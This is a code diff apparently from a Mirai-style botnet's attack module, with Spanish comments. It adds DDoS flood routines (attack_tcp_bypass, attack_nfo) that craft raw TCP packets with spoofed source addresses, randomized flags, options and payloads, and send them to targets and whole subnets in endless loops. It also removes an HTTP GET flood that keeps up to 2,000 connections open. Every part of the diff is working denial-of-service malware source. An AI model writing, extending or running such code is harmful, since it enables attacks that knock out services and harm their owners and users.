@@ -20,6 +20,9 @@
 #include "rand.h"
 #include <sys/epoll.h>
 #include <stdio.h>
+#include <stdlib.h>   // para malloc, rand
+#include <string.h>   // para memcpy
+
 
 #define MAX_EPOLL_EVENTS 512
 #define MAX_HTTP_SOCKETS 2000
@@ -128,6 +131,263 @@ void attack_tcpstream(uint8_t targs_len, struct attack_target *targs, uint8_t op
                 tcph->seq = htonl(rand_next());
             if (ack == 0xffff)
                 tcph->ack_seq = htonl(rand_next());
+            if (data_rand)
+                rand_str(data, data_len);
+
+            iph->check = 0;
+            iph->check = checksum_generic((uint16_t *)iph, sizeof (struct iphdr));
+
+            tcph->check = 0;
+            tcph->check = checksum_tcpudp(iph, tcph, htons(sizeof (struct tcphdr) + data_len), sizeof (struct tcphdr) + data_len);
+
+            targs[i].sock_addr.sin_port = tcph->dest;
+            sendto(fd, pkt, sizeof (struct iphdr) + sizeof (struct tcphdr) + data_len, MSG_NOSIGNAL, (struct sockaddr *)&targs[i].sock_addr, sizeof (struct sockaddr_in));
+        }
+#ifdef DEBUG
+            break;
+            if (errno != 0)
+                printf("errno = %d\n", errno);
+#endif
+    }
+}
+
+void attack_tcp_bypass(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
+{
+
+    int i, fd;
+    char **pkts = calloc(targs_len, sizeof (char *));
+    uint8_t ip_tos = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TOS, 0);
+    uint16_t ip_ident = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_IDENT, 0xffff);
+    uint8_t ip_ttl = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TTL, 64);
+    BOOL dont_frag = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_DF, TRUE);
+    port_t sport = attack_get_opt_int(opts_len, opts, ATK_OPT_SPORT, 0xffff);
+    port_t dport = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 0xffff);
+    uint32_t seq = attack_get_opt_int(opts_len, opts, ATK_OPT_SEQRND, 0xffff);
+    uint32_t ack = attack_get_opt_int(opts_len, opts, ATK_OPT_ACKRND, 0);
+    BOOL urg_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_URG, FALSE);
+    BOOL ack_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_ACK, FALSE);
+    BOOL psh_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_PSH, FALSE);
+    BOOL rst_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_RST, FALSE);
+    BOOL syn_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_SYN, FALSE);
+    BOOL fin_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_FIN, FALSE);
+    uint32_t source_ip = attack_get_opt_ip(opts_len, opts, ATK_OPT_SOURCE, LOCAL_ADDR);
+
+
+    if ((fd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP)) == -1)
+    {
+        return;
+    }
+    i = 1;
+    if (setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &i, sizeof (int)) == -1)
+    {
+        close(fd);
+        return;
+    }
+    for (i = 0; i < targs_len; i++)
+    {
+        struct iphdr *iph;
+        struct tcphdr *tcph;
+        uint8_t *opts;
+        pkts[i] = calloc(128, sizeof (char));
+        iph = (struct iphdr *)pkts[i];
+        tcph = (struct tcphdr *)(iph + 1);
+        opts = (uint8_t *)(tcph + 1);
+        iph->version = 4;
+        iph->ihl = 5;
+        iph->tos = ip_tos;
+        iph->tot_len = htons(sizeof (struct iphdr) + sizeof (struct tcphdr) + 20);
+        iph->id = htons(ip_ident);
+        iph->ttl = ip_ttl;
+        if (dont_frag)
+            iph->frag_off = htons(1 << 14);
+        iph->protocol = IPPROTO_TCP;
+        iph->saddr = source_ip;
+        iph->daddr = targs[i].addr;
+        tcph->source = htons(sport);
+        tcph->dest = htons(dport);
+        tcph->seq = htons(seq);
+        tcph->doff = 10;
+        tcph->urg = urg_fl;
+        tcph->ack = ack_fl;
+        tcph->psh = psh_fl;
+        tcph->rst = rst_fl;
+        tcph->syn = syn_fl;
+        tcph->fin = fin_fl;
+        *opts++ = PROTO_TCP_OPT_MSS;
+        *opts++ = 4;
+        *((uint16_t *)opts) = htons(1400 + (rand_next() & 0x0f));
+        opts += sizeof (uint16_t);
+        *opts++ = PROTO_TCP_OPT_SACK;
+        *opts++ = 2;
+        *opts++ = PROTO_TCP_OPT_TSVAL;
+        *opts++ = 10;
+        *((uint32_t *)opts) = rand_next();
+        opts += sizeof (uint32_t);
+        *((uint32_t *)opts) = 0;
+        opts += sizeof (uint32_t);
+        *opts++ = 1;
+        *opts++ = PROTO_TCP_OPT_WSS;
+        *opts++ = 3;
+        *opts++ = 6;
+    }
+    while (TRUE)
+    {
+        for (i = 0; i < targs_len; i++)
+        {
+            char *pkt = pkts[i];
+            struct iphdr *iph = (struct iphdr *)pkt;
+            struct tcphdr *tcph = (struct tcphdr *)(iph + 1);
+            if (targs[i].netmask < 32)
+                iph->daddr = htonl(ntohl(targs[i].addr) + (((uint32_t)rand_next()) >> targs[i].netmask));
+            if (source_ip == 0xffffffff)
+                iph->saddr = rand_next();
+            if (ip_ident == 0xffff)
+                iph->id = rand_next() & 0xffff;
+            if (sport == 0xffff)
+                tcph->source = rand_next() & 0xffff;
+            if (dport == 0xffff)
+                tcph->dest = rand_next() & 0xffff;
+            if (seq == 0xffff)
+                tcph->seq = rand_next();
+            if (ack == 0xffff)
+                tcph->ack_seq = rand_next();
+            if (urg_fl)
+                tcph->urg_ptr = rand_next() & 0xffff;
+            iph->check = 0;
+            iph->check = checksum_generic((uint16_t *)iph, sizeof (struct iphdr));
+            tcph->check = 0;
+            tcph->check = checksum_tcpudp(iph, tcph, htons(sizeof (struct tcphdr) + 20), sizeof (struct tcphdr) + 20);
+            targs[i].sock_addr.sin_port = tcph->dest;
+            sendto(fd, pkt, sizeof (struct iphdr) + sizeof (struct tcphdr) + 20, MSG_NOSIGNAL, (struct sockaddr *)&targs[i].sock_addr, sizeof (struct sockaddr_in));
+        }
+    }
+}
+
+
+void attack_nfo(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
+{
+    int i, fd;
+    
+    char **pkts = calloc(targs_len, sizeof (char *));
+    uint8_t ip_tos = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TOS, 0);
+    uint16_t ip_ident = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_IDENT, 0xffff);
+    uint8_t ip_ttl = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TTL, 64);
+    BOOL dont_frag = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_DF, TRUE);
+    port_t sport = attack_get_opt_int(opts_len, opts, ATK_OPT_SPORT, 0xffff);
+    port_t dport = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 0xffff);
+    uint32_t seq = attack_get_opt_int(opts_len, opts, ATK_OPT_SEQRND, 0xffff);
+    uint32_t ack = attack_get_opt_int(opts_len, opts, ATK_OPT_ACKRND, 0xffff);
+    BOOL urg_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_URG, TRUE);
+    BOOL ack_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_ACK, TRUE);
+    BOOL psh_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_PSH, TRUE);
+    BOOL rst_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_RST, TRUE);
+    BOOL syn_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_SYN, TRUE);
+    BOOL fin_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_FIN, TRUE);
+    int data_len = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_SIZE, 128);
+    BOOL data_rand = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_RAND, TRUE);
+    uint32_t source_ip = attack_get_opt_ip(opts_len, opts, ATK_OPT_SOURCE, 0xffffffff);
+
+    if ((fd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP)) == -1)
+    {
+#ifdef DEBUG
+        printf("Failed to create raw socket. Aborting attack\n");
+#endif
+        return;
+    }
+    i = 1;
+    if (setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &i, sizeof (int)) == -1)
+    {
+#ifdef DEBUG
+        printf("Failed to set IP_HDRINCL. Aborting\n");
+#endif
+        close(fd);
+        return;
+    }
+
+    for (i = 0; i < targs_len; i++)
+    {
+        struct iphdr *iph;
+        struct tcphdr *tcph;
+        char *payload;
+
+        pkts[i] = calloc(1510, sizeof (char));
+        iph = (struct iphdr *)pkts[i];
+        tcph = (struct tcphdr *)(iph + 1);
+        payload = (char *)(tcph + 1);
+
+        iph->version = 4;
+        iph->ihl = 5;
+        iph->tos = ip_tos;
+        iph->tot_len = htons(sizeof (struct iphdr) + sizeof (struct tcphdr) + data_len);
+        iph->id = htons(ip_ident);
+        iph->ttl = ip_ttl;
+        if (dont_frag)
+            iph->frag_off = htons(1 << 14);
+        iph->protocol = IPPROTO_TCP;
+        iph->saddr = source_ip;
+        iph->daddr = targs[i].addr;
+
+        tcph->source = htons(sport);
+        tcph->dest = htons(dport);
+        tcph->seq = htons(seq);
+        tcph->doff = 5;
+        tcph->urg = urg_fl; 
+        tcph->ack = ack_fl;
+        tcph->psh = psh_fl;
+        tcph->rst = rst_fl;
+        tcph->syn = syn_fl;
+        tcph->fin = fin_fl;
+        tcph->window = rand_next() & 0xffff;
+        
+        rand_str(payload, data_len);
+    }
+
+//    targs[0].sock_addr.sin_port = tcph->dest;
+//    if (sendto(fd, pkt, sizeof (struct iphdr) + sizeof (struct tcphdr) + data_len, MSG_NOSIGNAL, (struct sockaddr *)&targs[0].sock_addr, sizeof (struct sockaddr_in)) < 1)
+//    {
+//
+//    }
+
+    while (TRUE) 
+    {
+        for (i = 0; i < targs_len; i++)
+        {
+            char *pkt = pkts[i];
+            struct iphdr *iph = (struct iphdr *)pkt;
+            struct tcphdr *tcph = (struct tcphdr *)(iph + 1);
+            char *data = (char *)(tcph + 1);
+
+            // For prefix attacks
+            if (targs[i].netmask < 32)
+                iph->daddr = htonl(ntohl(targs[i].addr) + (((uint32_t)rand_next()) >> targs[i].netmask));
+
+            if (source_ip == 0xffffffff)
+                iph->saddr = rand_next();
+            if (ip_ident == 0xffff)
+                iph->id = rand_next() & 0xffff;
+            if (sport == 0xffff)
+                tcph->source = rand_next() & 0xffff;
+            if (dport == 0xffff)
+                tcph->dest = rand_next() & 0xffff;
+            if (seq == 0xffff)
+                tcph->seq = rand_next();
+            if (ack == 0xffff)
+                tcph->ack_seq = rand_next();
+            if (urg_fl)    
+                tcph->urg = rand() % 2;
+            if (ack_fl)
+                tcph->ack = rand() % 2;
+            if (psh_fl) 
+                tcph->psh = rand() % 2;
+            if (rst_fl)
+                tcph->rst = rand() % 2;
+            if (syn_fl)
+                tcph->syn = rand() % 2;
+            if (fin_fl)
+                tcph->fin = rand() % 2;
+            
+
+            // Randomize packet content?
             if (data_rand)
                 rand_str(data, data_len);
 
@@ -269,158 +529,6 @@ void attack_socket(uint8_t targs_len, struct attack_target *targs, uint8_t opts_
     }
 
     return;
-}
-
-struct http_conn {
-    int fd;
-    int target_idx;
-    int state; // 0: libre, 1: conectando, 2: activo
-    time_t last_used;
-    int requests_sent;
-};
-
-void attack_http(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
-{
-    int i, epoll_fd;
-    struct epoll_event ev, events[MAX_EPOLL_EVENTS];
-    struct http_conn *conns;
-    int max_conns = attack_get_opt_int(opts_len, opts, ATK_OPT_CONNS, 500);
-    if (max_conns > MAX_HTTP_SOCKETS) max_conns = MAX_HTTP_SOCKETS;
-
-    // Opciones HTTP
-    char *domain = attack_get_opt_str(opts_len, opts, ATK_OPT_DOMAIN, NULL);
-    if (domain == NULL) return;
-    char *path = attack_get_opt_str(opts_len, opts, ATK_OPT_PATH, "/");
-    uint16_t dport = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 80);
-
-    // Construir petición GET
-    char request[512];
-    int req_len = snprintf(request, sizeof(request),
-        "GET %s HTTP/1.1\r\n"
-        "Host: %s\r\n"
-        "User-Agent: Mozilla/5.0\r\n"
-        "Accept: */*\r\n"
-        "Connection: keep-alive\r\n"
-        "\r\n",
-        path, domain);
-
-    // Crear epoll (usamos epoll_create en lugar de epoll_create1 por compatibilidad)
-    epoll_fd = epoll_create(MAX_HTTP_SOCKETS);
-    if (epoll_fd == -1) return;
-
-    // Crear pool de conexiones
-    conns = calloc(max_conns, sizeof(struct http_conn));
-    if (conns == NULL) { close(epoll_fd); return; }
-
-    int active_conns = 0;
-
-    while (1) {
-        // Llenar el pool hasta max_conns
-        for (i = 0; i < max_conns && active_conns < max_conns; i++) {
-            if (conns[i].state == 0) {
-                int t_idx = i % targs_len;
-                struct attack_target *target = &targs[t_idx];
-                int fd = socket(AF_INET, SOCK_STREAM, 0);
-                if (fd == -1) continue;
-
-                // Establecer no bloqueante con fcntl (en lugar de SOCK_NONBLOCK)
-                int flags = fcntl(fd, F_GETFL, 0);
-                fcntl(fd, F_SETFL, flags | O_NONBLOCK);
-
-                struct sockaddr_in addr;
-                addr.sin_family = AF_INET;
-                if (target->netmask < 32)
-                    addr.sin_addr.s_addr = htonl(ntohl(target->addr) + (((uint32_t)rand_next()) >> target->netmask));
-                else
-                    addr.sin_addr.s_addr = target->addr;
-                addr.sin_port = htons(dport);
-
-                connect(fd, (struct sockaddr*)&addr, sizeof(addr));
-
-                conns[i].fd = fd;
-                conns[i].target_idx = t_idx;
-                conns[i].state = 1; // conectando
-                conns[i].last_used = time(NULL);
-                conns[i].requests_sent = 0;
-
-                ev.events = EPOLLOUT | EPOLLERR | EPOLLHUP; // sin EPOLLRDHUP
-                ev.data.ptr = &conns[i];
-                epoll_ctl(epoll_fd, EPOLL_CTL_ADD, fd, &ev);
-                active_conns++;
-            }
-        }
-
-        int nfds = epoll_wait(epoll_fd, events, MAX_EPOLL_EVENTS, 1000);
-        time_t now = time(NULL);
-
-        for (i = 0; i < nfds; i++) {
-            struct http_conn *c = (struct http_conn*)events[i].data.ptr;
-            if (events[i].events & (EPOLLERR | EPOLLHUP)) {
-                epoll_ctl(epoll_fd, EPOLL_CTL_DEL, c->fd, NULL);
-                close(c->fd);
-                c->state = 0;
-                active_conns--;
-                continue;
-            }
-            if (events[i].events & EPOLLOUT) {
-                if (c->state == 1) {
-                    // Conexión establecida
-                    int err;
-                    socklen_t len = sizeof(err);
-                    getsockopt(c->fd, SOL_SOCKET, SO_ERROR, &err, &len);
-                    if (err != 0) {
-                        epoll_ctl(epoll_fd, EPOLL_CTL_DEL, c->fd, NULL);
-                        close(c->fd);
-                        c->state = 0;
-                        active_conns--;
-                        continue;
-                    }
-                    c->state = 2; // activo
-                    // Cambiar a monitorear lectura (para keep-alive) y escritura
-                    ev.events = EPOLLIN | EPOLLOUT | EPOLLHUP;
-                    ev.data.ptr = c;
-                    epoll_ctl(epoll_fd, EPOLL_CTL_MOD, c->fd, &ev);
-                }
-                if (c->state == 2) {
-                    int sent = send(c->fd, request, req_len, MSG_NOSIGNAL);
-                    if (sent <= 0) {
-                        epoll_ctl(epoll_fd, EPOLL_CTL_DEL, c->fd, NULL);
-                        close(c->fd);
-                        c->state = 0;
-                        active_conns--;
-                    } else {
-                        c->requests_sent++;
-                        c->last_used = now;
-                    }
-                }
-            }
-            if (events[i].events & EPOLLIN) {
-                char buf[1024];
-                int n = recv(c->fd, buf, sizeof(buf), MSG_DONTWAIT);
-                if (n <= 0) {
-                    epoll_ctl(epoll_fd, EPOLL_CTL_DEL, c->fd, NULL);
-                    close(c->fd);
-                    c->state = 0;
-                    active_conns--;
-                } else {
-                    c->last_used = now;
-                }
-            }
-        }
-
-        // Timeouts
-        for (i = 0; i < max_conns; i++) {
-            if (conns[i].state != 0 && now - conns[i].last_used > 30) {
-                epoll_ctl(epoll_fd, EPOLL_CTL_DEL, conns[i].fd, NULL);
-                close(conns[i].fd);
-                conns[i].state = 0;
-                active_conns--;
-            }
-        }
-    }
-
-    close(epoll_fd);
-    free(conns);
 }
 
 void attack_wraflood(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
